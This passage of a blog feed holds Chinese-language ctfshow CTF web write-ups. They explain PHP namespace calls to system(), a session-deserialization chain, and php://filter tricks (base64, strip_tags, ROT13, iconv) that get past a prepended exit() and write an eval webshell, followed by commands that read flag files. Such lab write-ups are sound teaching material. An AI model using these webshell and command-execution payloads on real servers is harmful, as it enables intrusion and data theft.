<code>*&gt;z</code>  就是就是把当前文件夹的文件显示在 <code>z</code>  中<br>\n这样就只有文件 z 的内容就是 <code>nl index.php</code></p>\n<p>之后访问该文件，会自动下载该文件，文件内内容有 flag</p>\n<h1 id=\"红包题-耗子尾汁\"><a class=\"anchor\" href=\"#红包题-耗子尾汁\">#</a> 红包题 耗子尾汁</h1>\n<p>在 php 当中默认命名空间是 \\，所有原生函数和类都在这个命名空间中。普通调用一个函数，</p>\n<p>如果直接写函数名 function_name () 调用，调用的时候其实相当于写了一个相对路径；</p>\n<p>而如果写 \\function_name () 这样调用函数，则其实是写了一个绝对路径。如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法</p>\n<p>解一：<br>\n <code>a=\\system&amp;b[]=ls</code> <br>\n <code>a=\\system&amp;b[]=cat flag.php</code> <br>\n 解二：<br>\n套娃<br>\n <code>a=forward_static_call_array&amp;b[0]=system&amp;b[1][0]=ls</code></p>\n<h1 id=\"一切看起来都那么合情合理\"><a class=\"anchor\" href=\"#一切看起来都那么合情合理\">#</a> 一切看起来都那么合情合理</h1>\n<p>分析完代码，我们的思路就比较明确啦，我们可以利用 <code>index.php</code>  里面的 <code>session_start()</code>  设置，控制 $_SESSION 的值（也就是 limit）写入我们的 payload 到服务器的 <code>/tmp/sess_xxxx</code> ，然后利用 <code>nc.php </code> 里面的 <code>ini_set('session.serialize_handler', 'php')</code>  设置去反序列化服务器上的 <code>/tmp/sess_xxxx</code>  文件，从而执行 <code>inc.php</code>  里面 <code>User</code>  类的 <code>file_put_contents()</code>  函数写入一句话</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * @Author       : zhong</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @since        : 2022-07-21 23:57:24</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @lastTime     : 2022-07-22 00:31:02</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1.php'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php system('cat fl*');?&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p><code>|O:4:\"User\":3:{s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:26:\"&lt;?php system('cat fl*');?&gt;\";s:6:\"status\";N;}</code></p>\n<p>修改 <code>index.php</code>  的 <code>session</code>  值， <code>limit</code>  为上述代码得到的 base64 编码内容，之后不断提交并访问 <code>inc/inc.php</code> , 最后访问 <code>log-1.php</code></p>\n<p>得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>使用<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 16:07:03</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-06 19:21:29</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ctfshow{136f0acc-0af6-4036-bea1-48e6e7ee1258}\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>登陆失败<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span><span class=\"token number\">07</span><span class=\"token operator\">-</span><span class=\"token number\">22</span> <span class=\"token number\">00</span><span class=\"token punctuation\">:</span><span class=\"token number\">28</span><span class=\"token punctuation\">:</span><span class=\"token number\">30</span></pre></td></tr></tbody></table></figure><h1 id=\"新年好\"><a class=\"anchor\" href=\"#新年好\">#</a> 新年好？</h1>\n<p>payload: <code>/flag?delay=2147483648</code></p>\n<p><code>setTimeout</code>  最多只能推迟执行 <code>2147483647</code>  毫秒（24.8 天），超过这个时间会发生溢出，导致回调函数将在当前任务队列结束后立即执行</p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/25b29fe5/",
            "url": "http://dpm12345.cn/posts/25b29fe5/",
            "title": "新春欢乐赛_2022",
            "date_published": "2022-10-04T03:07:26.000Z",
            "content_html": "<h1 id=\"热身\"><a class=\"anchor\" href=\"#热身\">#</a> 热身</h1>\n<p>开局看到源码，但是却没有显示源码的代码。那么只能是被包含进去了，直接 phpinfo 搜 append 可以看到包含的文件，查看之得到 flag</p>\n<p>涉及到： <code>phpinfo()</code> , <code>append </code></p>\n<p><strong>phpinfo():</strong> 输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP 环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和 PHP 授权信息 (License)。</p>\n<h1 id=\"web-1\"><a class=\"anchor\" href=\"#web-1\">#</a> Web 1</h1>\n<p>对  <code>file_put_contents($content,'&lt;?php exit();'.$content);</code>  的绕过</p>\n<p>在这里，由于将  <code>exit();</code>  写入了文件，那么即使成功传入一句话木马，也无法执行，那么需要绕过  <code>exit()</code></p>\n<h2 id=\"绕过方法\"><a class=\"anchor\" href=\"#绕过方法\">#</a> 绕过方法</h2>\n<h3 id=\"round-1\"><a class=\"anchor\" href=\"#round-1\">#</a> Round 1</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'&lt;?php exit; ?&gt;'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$content</span> <span class=\"token operator\">.=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'txt'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p><code>$content</code>  在开头增加了  <code>exit</code>  过程，导致即使我们成功写入一句话，也执行不了。幸运的是，这里的</p>\n<p><code>$_POST['filename']</code>  是可以控制协议的，我们即可使用  <code>php://filter</code>  协议来施展魔法</p>\n<h4 id=\"方法一-base64-编码\"><a class=\"anchor\" href=\"#方法一-base64-编码\">#</a> 方法一、base64 编码</h4>\n<p>使用 <code>php://filter</code>  流的 <code>base64-decode</code>  方法，将 <code>$content</code>  解码，利用 <code>php base64_decode </code> 函数特性去除 “死亡 exit”。</p>\n<p>众所周知，base64 编码中只包含 64 个可打印字符 <code>（A-Z a-z 0-9 + /）'='</code>  补位，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>\n<p>所以，当 <code>$content</code>  被加上了 <code>&lt;?php exit;?&gt;</code>  后，我们可以使用 <code>php://filter/write=convert.base64-decode</code>  来首先对其解码。在解码的过程中，字符 <code> &lt;、?、;、&gt;、空格</code> 等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，所以最终被解码的字符仅有 “phpexit” 和我们传入的其他字符。</p>\n<p>“phpexit” 一共 7 个字符，<strong>因为 base64 算法解码时是 4 个 byte 一组</strong>，所以给他增加 1 个 “a” 一共 8 个字符。这样，\"phpexita\" 被正常解码，而后面我们传入的 webshell 的 base64 内容也被正常解码。结果就是  没有了。</p>\n<p>最终效果:</p>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406235335043-1930261389.png\" alt=\"\"></p>\n<h4 id=\"方法二-利用字符串操作方法-base64-组合拳\"><a class=\"anchor\" href=\"#方法二-利用字符串操作方法-base64-组合拳\">#</a> 方法二、利用字符串操作方法 + base64 组合拳</h4>\n<p>除了使用 base64 特性的方法外，我们还可以利用 <code>php://filter</code>  字符串处理方法来去除 “死亡 exit”。我们观察一下，这个 <code>&lt;?php exit; ?&gt;</code>  实际上是什么？</p>\n<p>这实际上是一个 XML 标签，既然是 XML 标签，我们就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。</p>\n<p>编写如下测试代码即可查看 <code>php://filter/read=string.strip_tags/resource=php://input</code>  的效果：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://filter/read=string.strip_tags/resource=php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406234627327-1601681134.png\" alt=\"\"></p>\n<p>可见， <code>?php exit; ?&gt;</code>  被去除了。但回到上面的题目，我们最终的目的是写入一个 webshell，而写入的 webshell 也是 php 代码，如果使用 <code>strip_tags</code>  同样会被去除。</p>\n<p>万幸的是， <code>php://filter</code>  允许使用多个过滤器，我们可以先将 webshell 用 base64 编码。在调用完成 <code>strip_tags</code>  后再进行 <code>base64-decode</code> 。“死亡 exit” 在第一步被去除，而 webshell 在第二步被还原。</p>\n<p>最终效果：</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web1_3.png\" alt=\"\"></p>\n<h4 id=\"方法三-rot13-编码\"><a class=\"anchor\" href=\"#方法三-rot13-编码\">#</a> 方法三、ROT13 编码</h4>\n<p>原理和上面类似，核心是将 “死亡 exit” 去除。 <code>&lt;?php exit; ?&gt;</code>  在经过 rot13 编码后会变成 <code>&lt;?cuc rkvg; ?&gt;</code></p>\n<p>在 PHP 不开启 <code>short_open_tag</code>  时，php 不认识这个字符串，当然也就不会执行了</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web1_4.png\" alt=\"\"></p>\n<h3 id=\"round-2\"><a class=\"anchor\" href=\"#round-2\">#</a> Round 2</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'txt'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;?php exit();\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>这种是前后两个变量相同，假设 <code>$a</code>  可控情况。</p>\n<p>这种相同变量的构造方式和不同变量的构造方式思路是大差不差的，都是需要干掉 <code>&lt;?php exit();</code> ，只不过构造起来相对更复杂一些。</p>\n<h4 id=\"方法一-base64-编码-2\"><a class=\"anchor\" href=\"#方法一-base64-编码-2\">#</a> 方法一、base64 编码</h4>\n<p>根据前面介绍的不同变量的构造方法，很容易拓展到相同的变量，同样利用 <code>php://filter</code>  来构造，反正后面是写入的内容，只要在后面解码的时候把 shell 解码出来，不需要的东西解码成乱码即可，而 Base64 构造的话，例如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>$a=php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>（    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>    base64编码    PD9waHAgcGhwaW5mbygpOz8+      ）</pre></td></tr></tbody></table></figure><p>构造的 shell 可以放在过滤器的位置和文件名位置都可以（其他编码有时候会有空格什么的乱码，文件名不一定好用）， <code>php://filter</code>  面对不可用的规则（一串 base64）是报个 Warning，绕后跳过继续执行的（不会退出），所以按理说这样构造是 “很完美” 的。我们看下 <code>base-decode</code>  哪些字符👇</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>php://filter/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=shell.php</pre></td></tr></tbody></table></figure><p>而默认情况下 base64 编码是以 <code>=</code>  作为结尾的，所以正常解码的时候到了 <code>=</code>  就解码结束了，即使我们构造 payload 的时候不用 <code>write=</code> ，但是在最后获取文件名的时候 <code>resource=</code>  中的 <code>=</code>  过不掉，所以导致过滤器解码失败，从而报错...</p>\n<p>这里用 base64 编码我还没找到好的方法，待补充...</p>\n<h4 id=\"方法二-rot13\"><a class=\"anchor\" href=\"#方法二-rot13\">#</a> 方法二、ROT13</h4>\n<p>rot13 编码就不存在 base64 的问题，所以和前面 base64 构造的思路一样</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>$a = php://filter/write=string.rot13|<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>cuc <span class=\"token function\">cucvasb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>/resource=shell.php</pre></td></tr></tbody></table></figure><p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web1_5.png\" alt=\"\"></p>\n<p>和前面提到的一样，这种方法是需要服务器没有开启短标签的时候才可以使用 (默认情况是没开启的： <code>php.ini</code>  中的 <code>short_open_tag</code> )</p>\n<h4 id=\"方法三-iconv-字符编码转换\"><a class=\"anchor\" href=\"#方法三-iconv-字符编码转换\">#</a> 方法三、iconv 字符编码转换</h4>\n<p>通过字符转换把 <code>&lt;?php exit();</code>  转成不能解析的，这里采用的是 UCS-2 或者 UCS-4 编码方式，而我们构造的转成可正常解析的</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>#echo iconv(\"UCS-2LE\",\"UCS-2BE\",'<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>');</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hp</span> <span class=\"token attr-name\">phpipfn(o;)</span><span class=\"token punctuation\">&gt;</span></span>?</pre></td></tr></tbody></table></figure><p>这里用的是 UCS-2，当然我们也可以用 UCS-4</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>echo iconv(\"UCS-4LE\",\"UCS-4BE\",'aa<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>');</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>aa</span> <span class=\"token attr-name\">phpiphp(ofn</span><span class=\"token punctuation\">&gt;</span></span>?;)</pre></td></tr></tbody></table></figure><p>通过 UCS-2 或者 UCS-4 的方式，对目标字符串进行 2/4 位一反转，也就是说构造的需要是 UCS-2 或 UCS-4 中 2 或者 4 的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了，构造 payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">**</span><span class=\"token keyword\">or</span><span class=\"token operator\">**</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'php://filter/convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=shell.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#由于是 4 位一反转，所以需要保证？&lt;aa phpiphp (ofn&gt;?;) 之前字符个数是 4 的倍数，所以补充了 xxx</span></pre></td></tr></tbody></table></figure><p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407105517997-451500709.png\" alt=\"\"></p>\n<h4 id=\"方法四-iconv-字符编码转换-rot13-编码组合拳\"><a class=\"anchor\" href=\"#方法四-iconv-字符编码转换-rot13-编码组合拳\">#</a> 方法四、iconv 字符编码转换 + ROT13 编码组合拳</h4>\n<p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，原因前面描述过了，就不赘述，这里就用 UCS-2 和 rot13 举一个例子吧</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>$a = 'php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>uc</span> <span class=\"token attr-name\">cucvcsa(b;)</span><span class=\"token punctuation\">&gt;</span></span>?/resource=shell.php'</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#先将 <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?&gt;</span></span> 进行rot13得到<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>cuc <span class=\"token function\">cucvasb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>#再对<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>cuc <span class=\"token function\">cucvasb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>进行UCS2编码转换得到?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>uc</span> <span class=\"token attr-name\">cucvcsa(b;)</span><span class=\"token punctuation\">&gt;</span></span>?</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>#最后x 补位</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>#最终得到x?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>uc</span> <span class=\"token attr-name\">cucvcsa(b;)</span><span class=\"token punctuation\">&gt;</span></span>?</pre></td></tr></tbody></table></figure><p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407111602416-1849632067.png\" alt=\"\"></p>\n<p>为何不用 <code>string.strip_tags</code>  呢？因为 rot13 转换的同样会被 <code>strip_tags</code>  方法给删除了，而 UCS-2 或 UCS-4 构造的也同样会被 <code>strip_tags</code>  方法给删除，这里需要找其他的编码方式进行构造。</p>\n<p><strong>rot13 payload:</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>content<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/write=string.rot13||/resource=shell.php</span></pre></td></tr></tbody></table></figure><p>其中 <code>&lt;?cuc @riny($_CBFG[pzq]);?&gt;</code>  为 <code>&lt;?php @eval($_post[cmd]);?&gt;</code>  的 rot13 加密结果 ( <code>@</code> 的作用为即使错误也执行)</p>\n<p>所以访问 <code>shell.php</code> , 然后 post 传入 <code>cmd=system('ls /');</code> , 查看源码发现有 <code>flag.txt</code> ，然后再 post 传入 <code>cmd=system('cat /flag.txt');</code></p>\n<p>对于 <code>system ('ls /')</code> ，加斜杠即访问 file system (或者说为根目录) 中的文件，不加斜杠即为当前目录下的文件</p>\n<h1 id=\"web-2\"><a class=\"anchor\" href=\"#web-2\">#</a> Web 2</h1>\n<p>题目代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$$$$$</span><span class=\"token punctuation\">{</span><span class=\"token function\">key</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"HappyNewYear\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>一共涉及到了四个函数 <code>count()</code> , <code>extracy()</code> , <code>call_user_func()</code> , <code>key()</code></p>\n<p>**count (): ** 计算数组中的单元数目，或对象中的属性个数</p>\n<p><strong>extract()</strong>: 从数组中将变量导入到当前的符号表</p>\n<p><strong>call_user_func():</strong> 第一个参数 <code>callback</code>  是被调用的回调函数，其余参数是回调函数的参数。返回回调函数的返回值。</p>\n<p><strong>key()</strong>: 从关联数组中取得键名</p>\n<p>post 传入 <code>session_id=session_id</code></p>\n<p>cookie= <code>PHPSESSID=HappyNewYear</code></p>\n<h1 id=\"web-3\"><a class=\"anchor\" href=\"#web-3\">#</a> Web 3</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2022-01-16 15:42:02</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2022-01-24 22:14:02</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token 